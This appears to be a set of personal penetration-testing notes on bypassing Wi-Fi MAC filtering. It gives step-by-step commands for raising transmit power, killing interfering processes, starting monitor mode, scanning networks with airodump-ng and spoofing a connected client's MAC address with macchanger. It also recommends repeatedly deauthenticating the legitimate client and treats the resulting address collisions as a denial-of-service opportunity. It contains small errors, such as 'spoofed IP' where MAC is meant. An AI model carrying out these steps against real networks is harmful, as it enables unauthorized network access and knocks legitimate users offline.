# MAC filtering bypass
MAC filtering involves allowing only devices with specific MAC (Media Access Control) addresses to connect to the network. This process typically involves MAC address spoofing, where an attacker changes their device's MAC address to match an allowed device, thereby gaining access to the network. 

We might have the right password, but there might be MAC filtering going on that will disallow us from connecting to the network. To bypass the MAC filtering, we can spoof our MAC address to match one of the connected clients. However, this approach often leads to collision events, as two devices with the same MAC address cannot coexist on the same network simultaneously. However, one device can connect to the 2.4GHz frequency, and another device with the same MAC address can connect to the 5GHz.

To connect to the same frequency, forcibly disconnect the legitimate client via deatuh, thereby freeing up the MAC address for use, then connect with spoofed IP.

### NOTE
Occasionally, when configuring our MAC address to match that of a client or access point, we may encounter collision events at the data-link layer. This technique of bypassing MAC filtering is most effective when the client we're mimicking is not currently connected to our target network. However, there are instances where these collision events become advantageous to us, serving as a means of denial-of-service (DOS) attack. In the case of a dual-band or multiple access point network, we may be able to utilize a MAC address of a client connected to a separate access point within the same wireless infrastructure.

---

## Setup
Set router to max power
```
ifconfig wlan1 down
```
```
iwconfig wlan1 txpower 30
```
```
ifconfig wlan1 up
```
Preemptively kill everything that gets in your way:
```
airmon-ng check kill
```
Start monitor mode:
```
airmon-ng start wlan1
```
Save what's out there and save to a file:
```
sudo airodump-ng wlan1mon --band agp -w dump
```

---

See MAC address
```
sudo macchanger wlan1mon
```
What is on 2.4? 5? Hidden Networks? What's clients are connected to what APs?
Change MAC address:
```
sudo ifconfig wlan1mon down
```
```
sudo macchanger wlan1 -m 3E:48:72:B7:62:2A
```
```
sudo ifconfig wlan1mon up
```
Check changes made:
```
sudo macchanger wlan1mon
```
OR:
```
ifconfig wlan1
```
Connect to AP via GUI or CLI and verify connection with:
```
ifconfig
```
Remember 2 devices can't connect to the same network with the same MAC address so either:
- Perpetually deauth legit client to free up space however it's most effective when the client we're mimicking is not currently connected to our target network at all.
- Connect to the other frequency the device isn't connected to on the network (5 or 2.4)


